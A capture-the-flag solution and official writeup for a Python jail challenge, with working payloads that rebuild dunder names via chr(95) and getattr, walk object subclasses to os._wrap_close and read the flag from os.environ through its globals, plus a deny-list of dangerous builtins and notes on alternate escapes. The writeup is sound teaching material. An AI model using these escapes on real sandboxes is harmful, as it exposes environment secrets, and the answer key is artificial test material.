# Dunderdome — solution

Run commands from this challenge's title directory. Python dependencies, when needed, are in `solution/requirements.txt`.

```bash
python solution/solve.py --local solution/runtime/server.py
```

`accepted_flags.txt` records the accepted event answers. Locally reproduced services use their source defaults unless a flag is supplied through the documented environment variable; those demo answers can differ from the event answer.

# Dunderdome — official writeup

**Flag:** `zerosecurectf{br3ak_th3_d0me_w1th0ut_a_s1ngl3_dund3r}` (static demo
seed; per-instance in production).


## The restriction model

The jail evaluates exactly one Python expression under a screen (`screen()` in
`challenge/server.py`). The screen enforces, in order:

1. **ASCII only, ≤ 4096 bytes.** The ASCII rule kills the NFKC-confusable trick
   (Python normalises identifiers, so `ꜰopen`-style homoglyphs are a classic
   way to smuggle a banned name past a text filter).
2. **One expression, `eval` mode.** `ast.parse(src, mode="eval")` rejects every
   statement outright — no `import`, no `=`, no `;`, no `exec`-as-statement.
3. **No `__`.** The two-character sequence `__` may not appear in the source,
   and no identifier may contain it. This is the headline rule: you cannot
   *type* a dunder, so `().__class__`, `__import__`, `"{0.__globals__}".format`
   and every other literal-dunder escape is dead on arrival.
4. **A deny-list of identifiers** (`HARD_BANNED` + a per-seed half of `POOL`),
   checked against every `Name`, `Attribute.attr`, keyword-arg and lambda-arg.
   `eval`, `exec`, `open`, `globals`, `vars`, … are gone.
5. **A restricted builtins table** at `eval` time — only the allow-list exists,
   so even a name that slipped the AST check resolves to nothing.

Crucially, `getattr` and `chr` are **in** the allow-list (and never banned),
and the banner prints the exact per-instance ban-set so there is nothing to
guess.


## Why it breaks

Two gaps, and you need both:

**Gap 1 — the screen inspects *text*, not *runtime values*.** Rule 3 forbids the
*characters* `__` in your source. It does not — and cannot, in general — forbid
a *string your code builds at runtime* from equalling `"__"`. `chr(95)*2`
evaluates to `"__"`, but the source `chr(95)*2` contains no underscore at all.
So you reconstruct the dunder names the filter forbade you to type, and feed
them to the `getattr` the filter left you:

```python
U = chr(95) * 2                       # the string "__", never typed
getattr((), U+'class'+U)              # == ().__class__            -> tuple
getattr(tuple, U+'base'+U)            # == tuple.__base__          -> object
getattr(object, U+'subclasses'+U)()   # == object.__subclasses__() -> every class
```

**Gap 2 — a live object carries its *own* globals, regardless of your builtins.**
Restricting the `eval` builtins table only restricts *name lookup inside your
expression*. Any class you reach via `__subclasses__()` still has its original
`<class>.__init__.__globals__` — the real module namespace it was defined in.
A class defined in `os` (e.g. `os._wrap_close`, always present once `os` is
imported, which this server does) therefore hands you the live `os` module
globals — including `os.environ`, where the flag lives:

```python
g = getattr(getattr(os_wrap_close, U+'init'+U), U+'globals'+U)   # os's globals
g['environ']['ZSCTF_FLAG']                                        # the flag
```

The restricted builtins never mattered: you reached the real namespace through
an object you were *allowed* to hold.


## Steps / the payload

Read it back as the **value of the expression**, so the jail prints it for you.
The clearest form (targets `os._wrap_close` by class name — note `_wrap_close`
has only single underscores, so it is typeable):

```python
(lambda U:
  getattr(getattr(
    [c for c in getattr(getattr(getattr((),U+'class'+U),U+'base'+U),U+'subclasses'+U)()
       if getattr(c,U+'name'+U)=='_wrap_close'][0],
    U+'init'+U), U+'globals'+U)['environ']['ZSCTF_FLAG']
)(chr(95)*2)
```

The reference solver (`solution/solve.py`) sends a **name-independent** variant that
scans every subclass for the one whose module globals expose `environ`
containing the flag — so it does not depend on any particular CPython subclass
index or name:

```python
(lambda U: [v['environ']['ZSCTF_FLAG']
  for c in getattr(getattr(getattr((),U+'class'+U),U+'base'+U),U+'subclasses'+U)()
  for v in [getattr(getattr(c,U+'init'+U,0),U+'globals'+U,0)]
  if v and 'environ' in v and 'ZSCTF_FLAG' in v['environ']][0])(chr(95)*2)
```

Both use only `getattr`, `chr`, string literals with no `__`, a tuple literal, a
comprehension and subscripting — all permitted — and contain no `__`.


## Why the intended path is the only *cheap* one

- **No literal-dunder one-liner.** `().__class__.__base__.__subclasses__()`,
  `__import__('os')`, `"{0.__globals__}".format(x)` all contain `__` → rejected
  by rule 3. Even `getattr((),'__class__')` is rejected — you must *build* the
  string, not type it. (The test asserts all of these are `REJECTED`.)
- **No banned builtin.** `open`, `eval`, `exec`, `compile`, `globals`, `vars`,
  `breakpoint` are both on the deny-list and absent from the builtins table.
- **No guessing.** Every rule, the full per-instance ban-set, and the available
  builtins are printed in the banner; the source is shipped. The route is
  reachable purely by reasoning (design invariant: guess-exposure ≈ 0).

### Honest notes on alternate routes

- **The `\x5f` variant.** Instead of `chr(95)*2`, a player may write the string
  literal `"\x5f\x5f..."` — its *source text* contains `\x5f`, not `__`, so it
  passes, and its *value* is the dunder name. This is the same technique
  (construct, don't type) and is fully intended.
- **Frame climbing.** `f_globals` / `f_back` / `gi_frame` are listed in
  `HARD_BANNED` to block their *literal* `obj.f_back` form, but — being
  consistent with Gap 1 — `getattr(x, 'f'+'_back')` can still reach them. We do
  not claim otherwise: in an expression-only jail with no `sys` and no
  exception handling, frame climbing is awkward but not provably impossible, and
  it is a legitimate (non-trivial) alternate escape. The challenge requirement
  is "no *trivial one-liner*," which holds.


## Design notes (for the ZSCTF team)

- **Lineage** (see `corpus-genome.yaml`):
  - `zsctf-misc-002 "Prison Reform"` (pyjail with AST restrictions; affordances
    `GUARD-SWAP`, `PARAMETERISE`) → **GUARD-SWAP** the ban target from
    "attributes/constants/names" to "the literal `__` sequence + a builtins
    deny-list," and **PARAMETERISE** the ban-list per seed — exactly its
    documented knob ("tune the AST ban-list as a difficulty knob").
  - `zsctf-misc-001 "clyde-jail"` (escape a sandboxed expression evaluator;
    `GUARD-SWAP`, `GROUND`) → **SUBSTITUTE-TARGET** JS-math-sandbox → a
    Python-expression sandbox.
  - `zsctf-misc-004 "Looney Shell"` (builtins disabled + environment as the
    thing you must reach; `GUARD-SWAP`, `GROUND`) → **GROUND** the "disabled
    builtins, secret in the environment" shape into `ZSCTF_FLAG` reached via
    `os.environ` after escaping the restricted builtins.
- **Per-instance.** `ZSCTF_SEED` deterministically bans ~half of `POOL`
  (same seed → same jail; different seed → different toolset), and `ZSCTF_FLAG`
  is per-team. The intended path uses only `CORE_ALLOWED` names, so it survives
  every seed; the knob closes *alternative* routes and prevents canned
  paste-solutions that rely on a specific extra builtin.
- **Harder variants (extrapolation, to raise the band toward Frontier):**
  1. **Ban `Attribute` nodes entirely** *and* remove `getattr` — now you cannot
     access attributes at all and must bootstrap from generator/`format`/operator
     primitives. (This is the Prison-Reform "near-empty Python" direction.)
  2. **Character-restrict** the source: no letters, or no digits, forcing value
     construction before any escape (the classic "no-alnum" pyjail).
  3. **Audit-hook / `exec`-free bytecode** jails, or an `audit`-event tripwire
     (`sys.addaudithook`) that fires on `os.system`/`open`, moving the fight
     from name-reachability to behaviour.
  These are tracked as `GUARD-SWAP` / `CONSTRAIN` neighbours of this seed.

---

